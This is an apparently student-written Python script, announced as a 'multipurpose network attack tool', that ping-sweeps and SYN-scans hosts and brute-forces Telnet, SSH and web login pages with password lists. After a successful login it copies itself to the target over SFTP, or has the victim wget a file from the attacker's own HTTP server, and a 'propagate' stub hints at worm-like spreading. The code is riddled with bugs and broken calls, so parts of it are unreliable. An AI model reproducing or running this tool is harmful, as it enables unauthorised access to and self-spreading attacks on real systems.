#!/usr/bin/python3

import logging
from scapy.all import *
import argparse
import requests
import sys
from telnetlib import Telnet
import ftplib
import paramiko
import time
import ipaddress
import scapy

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def main():

    def help():
        print()
        print("This is a multipurpose network attack tool")
        print()
        print("Usage: ")
        print("To check the list of active hosts in the ip list")
        print("sudo python3 net_attack.py -t <target IP list> ")
        print()
        print("To check all 65535 ports or scan specific ports")
        print("sudo python3 net_attack.py -t <target IP list> ")
        print()
        print("To check if the telnet services can be bruteforced")
        print("sudo python3 net_attack.py <ipaddress> -p <port> -u <username> -f <password list>")
        print()
        print("To check if the SSH services can be bruteforced")
        print("sudo python3 net_attack.py -t ipaddress.txt -f <password list> -u <username> -p 22")
        print()
        print("To check if the web services can be bruteforced")
        print("sudo python3 net_attack.py -t ipaddress.txt -f <password list> -u <username> -p 80/8080/8000")
        print()

#Error validation if user inputs only one cli argument

    if len(sys.argv)==1: # Checks if the length of the arguments are exactly equal to one

        print("This tool requires some CLI arguments to perform.")
        help()
        sys.exit()



    #LOCAL SCAN -L, This performs a Local scan

    def local_scan():

        def l_scan():

            interfaces = get_if_list() # Gets the IP address of the interfaces in the machine
            interfaces.remove("lo") # Removes loopback address from the existing interfaces



            for i in range(len(interfaces)):  #running for loop for printing the list of ip addresses for every interface
                (interfaces[i])
                print("Interface: ", interfaces[i])
                ip_int = get_if_addr(interfaces[i])
                ip = ip_int + "/32"
                print("IP address: ", ip)
                for i in range(1): # A for-loop to iterate through every IP

                        ans, unans = sr(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0) # Sending an ICMP packet to check if any IP of our interfaces responds
                        
                        if not unans:
                            ans.summary(
                                lambda p: p[1].sprintf('[+] STATUS for %IP.src%:' + ' Host down!') # Alerts the user saying the Host is up
                            )


                        else:
                            print(f'[-] STATUS for {ip}: Host up\n') # Alerts the user saying the interface is down and has no ip address


                            
        l_scan()
        exit()

    def propagate(): # This is a proopagate function which will send the script to the list of ip addresses that are active in our  network
        local_scan()



    if "-L" in sys.argv: # Input validation to choose local scan if there are only 2 arguments with "-L"
        if len(sys.argv)==2:
            local_scan() # performs local scan

    elif "-P" in sys.argv:  # Input validation to choose local scan if there are only 2 arguments with "-L"
        if len(sys.argv)==2:
            propagate() # performs propagation


    def is_reachable(): # this function pings every devices in the network
        
        filename = sys.argv[sys.argv.index("-t")+1] # The filename is the list of ip addresses that will be iterated in the text file

        def icmpcheckalive(): # This is the function that actually pings all the network IP addresses 
            with open(filename, "r", newline=None) as fd:  # Opening the ip address file in read mode
                for ip in fd:

                    ip = ip.replace("\n", "") # Stripping apart the endline notation for every line of the text file 
                    ip = str(ip)    # converting the ip to string for parsing
                    print("pinging", ip) # Displays that the ip is being pinged

                        
                    ans, unans = sr(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0) # Sending the ICMP ping to all the machines
                    if not unans:
                        
                        ans.summary(

                            lambda p: p[1].sprintf('[+] STATUS for %IP.src%:' + "\x1b[0;30;42m"f' Host Up!' + "\x1b[0m\n") 
                        ) # prints host is up provided it gets a response for the ICMP message
                    else:
                        print(f'[-] STATUS for {ip}: Host Down\n')  # prints host is down provided it gets a response for the ICMP message

        icmpcheckalive()


    def read_ip_list():
        filename = sys.argv[sys.argv.index("-t")+1] # This reads the list of ip addresses in the list given by teh user in the command line argument

        def ipread():
            with open(filename, "r", newline=None) as fd: # Opening the ip address file in read mode
                for ip in fd:

                    ip = ip.replace("\n", "") # Stripping apart the endline notation for every line of the text file 
                    ip = str(ip)
                    print(ip)
        ipread()

    if len(sys.argv)==3:

        if "-t" in sys.argv:
            print("The IP addresses in the list are as below:")
            read_ip_list()
            print()
            print("The script for reachability are running...")
            is_reachable()



    def bruteforce_telnet(ip_file): # Reads from a file that contains the ip addresses
        
        def enc(s):
          return s.encode("ascii")
        
        with open(ip_file, "r") as f: 

            global count
                

            for host in f.readlines():      # reading the ip addresses from the ip list
                host = host.strip()
                
                
                with open(passFile, "r", newline=None) as fd:
                    global count
                    
                    for password in fd.readlines():
                        
                        password = password.strip()
                        subprocess.call(["python3 -m http.server&"], shell = True) # Starting up an HTTP server
                       
                        inter = conf.iface
                        
                        ip = get_if_addr(inter) 
                        tel = Telnet(host, port)        # Telnet authentication
                        tel.read_until(enc("login: "))  # Telnet login being tried
                        tel.write(enc(user + "\n"))
                        tel.read_until(enc("Password: ")) # Telnet password being tried
                        tel.write(enc(password + "\n"))

                        
                        print("Credentials: " + user + ":" + password)  # The credentials are displayed for the user
                        
                        filename = sys.argv[sys.argv("-d")+1]
                        if "-d" in sys.argv:

                            tel.write(enc("wget " +ip+":8000/"+filename+ "\n"))  # Downloads the webpage of our attacker machine using the python HTTP server
                            print("\x1b[0;30;42m"f"Successfully Brute forced Telnet and file is deployed!"+"\x1b[0m\n")     # The dile is deployed and Telnet is bruteforced      
                        sys.exit()
                        
                       
                        
                        tel.write(enc("exit\n"))    #Exiting the telnet session
                        text = tel.read_all().decode("ascii")
                        print(text)




        def bruteforce_ssh():       # Bruteforcing the SSH service of the clients


            count = 1       # setting up a counter variable
        
        

        def connectSSH(hostname, port, username, passFile): # passing the value of hostname, port, username and the password file
            

     
            ssh_client = paramiko.SSHClient()       # Creating an object from the paramiko library
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            with open(passwordFile, "r") as f:      # Reading the password file in read mode
                
                global count
                for password in f.readlines():      # Reading the password from the list of passwords
                    password = password.strip()
                    
                    
                    try:
                        with open(hostname, "r", newline=None) as fd:       # The hostname is the file where the ipaddresses are located in
                            for hostname in fd:

                                hostname = hostname.replace("\n", "")
                                hostname = str(hostname)

                         
                                ssh_client.connect(hostname, port=port, username=username, password=password)       #Passing the required data for SSH session establishment
                                
                                print("[" + str(count) + "] " + "\x1b[0;30;42m"f"[+] Password Success ~ " + password + "\x1b[0m\n")
                                print("*" * 50)
                                print("HostName: " + hostname)
                                print("Credentials: " + user + ":" + password)
                                stdin, stdout, stderr=ssh_client.exec_command("ls \n")      # Firing a command from the target's shell to see the list of file that are being displayed
                                print(stdout.readlines())
                                ftp_client=ssh_client.open_sftp()       # Setting up an FTP server to send the files from the Paramiko library
                                ftp_client.put('
                                               .py','/home/'+username +'/net_attack.py')     #The file is being sent to the target 
                                print("\x1b[0;30;42m"f"[->]File successfully transferred!"+"\x1b[0m\n")
                                ftp_client.close()      # The FTP session is ended

                        break
                    except:
                        count = 0
                        print("[" + str(count) + "] " + "[-] Password Failed ~ " + password)
                        count += 1
                       

        hostname = sys.argv[sys.argv.index("-t")+1]

        passwordFile = sys.argv[sys.argv.index("-f")+1]

        username = sys.argv[sys.argv.index("-u")+1]

        connectSSH(ip, 22, user, passFile)



    def scan_port():



        # output format 
        def print_ports(port, state):
            print("%s | %s" % (port, state))

        def syn_scan(ip, port, ip_file):        # This scan sends out TCP packets with Syn flag set
            print(ip)                           
            print(port)
            with open(ip, "r", newline=None) as fd:
                for ip in fd:
                    
                    port = sys.argv[sys.argv.index("-p")+1]         #Setting up the value of port

                    ip = ip.replace("\n", "")       # stripping off the endline character in a text file
                    ip = str(ip)    # converting the ip into a string
                    print(ip)
                    print("pinging", ip)
                    print("Port Scanning on, %s with ports %s" % (ip, port))
                    sport = RandShort()
                    for port in ports:
                        pkt = sr1(IP(dst=ip)/TCP(sport=sport, dport=port, flags="S"), timeout=1, verbose=0)     # Sending the SYN packet to the list of devices in a loop
                        if pkt != None:
                            if pkt.haslayer(TCP):
                                if pkt[TCP].flags == 20:        # If no SYN/ACK packet was sent to the attacker
                                    print_ports(port, "Closed") # prints out that the port is closed
                                elif pkt[TCP].flags == 18:      # If it sends out a SYN/ACK packet, then the port is open
                                    print_ports(port, "\x1b[0;30;42m" + f"Open" + "\x1b[0m")    # Prints out the port and its state that is open
                                    if (port == int(80) or port == int(8000) or port == int(8080)): # Checks if any HTTP ports are open
                                        bruteforce_web()
                                    if (port == int(22)): #Checks if the SSH port is open or close
                                        bruteforce_ssh()
                                    if (port == int(23)):   #Checks if the telnet port is open or close
                                        bruteforce_telnet(ip_file)
                                    print_ports(port, "TCP packet resp / filtered")
                            elif pkt.haslayer(ICMP):
                                print_ports(port, "ICMP resp / filtered")
                            else:
                                print_ports(port, "Unknown resp")
                                print(pkt.summary())
                        else:
                            print_ports(port, "Unanswered")
            syn_scan(ip,port)       # calling the function
        

        # argument setup
        parser = argparse.ArgumentParser("Port scanner using Scapy")
        parser.add_argument("-t", "--ip", help="Specify ip IP", required=True)
        parser.add_argument("-u", "--user", help="Specify ip IP", required=True)
        parser.add_argument("-d", "--filename", help="Specify ip IP", required=True)
        parser.add_argument("-f", "--password_file", help="Specify ip IP", required=True)   # Argparse is used to vaildate the list of arguments that are allowed in teh program
        parser.add_argument("-p", "--ports", type=int, nargs="+", help="Specify ports (22 23 80 ...)")

        args = parser.parse_args()

        # arg parsing
        ip = args.ip

        ip_file = ip
     

        print("name of files: ",ip)


        # set ports if passed
        if args.ports:
            ports = args.ports
            syn_scan(ip, port, ip_file)     # Calling the syn_scan to start scanning the ports

        



    ip = sys.argv[sys.argv.index("-t")+1]       # The input validation for the list of arguemtns that are allowed for port scanning and bruteforcing

    port = sys.argv[sys.argv.index("-p")+1]

    user = sys.argv[sys.argv.index("-u")+1]

    passFile = sys.argv[sys.argv.index ("-f")+1]

    scan_port()


    # define the webpage you want to crack

    # this page must be a login page with a username and password
    def bruteforce_web():  # This function attempts to brute force the login page if any HTTP port server are open

        with open(ip, "r", newline=None) as fd:     # Opening the IP file in read mode
            print()
            for hostname in fd:


                url = "http://"+hostname+":80/login.php"    # The hostname's ip adddress is checked wiht the desired port number
                url = "http://"+hostname+":8000/login.php"
                url = "http://"+hostname+":8080/login.php"



                username = sys.argv[sys.argv.index("-u")+1]                     # let's get the username

                password_file = sys.argv[sys.argv.index("-f")+1]     # next, let's get the password file

                file = open(password_file, "r")             # open the password file in read mode

                for password in file.readlines():       # now let's get each password in the password_file

                    password = password.strip("\n")      # let's strip it of any \n

                    data = {'username':username, 'password':password, "Login":'submit'}     # collect the data needed from "inspect element"

                    send_data_url = requests.post(url, data=data)

                    if "Login failed" in str(send_data_url.content):

                        print("[*] Attempting password: %s" % password)

                    else:

                        print("[*] Password found: %s " % password)

main()
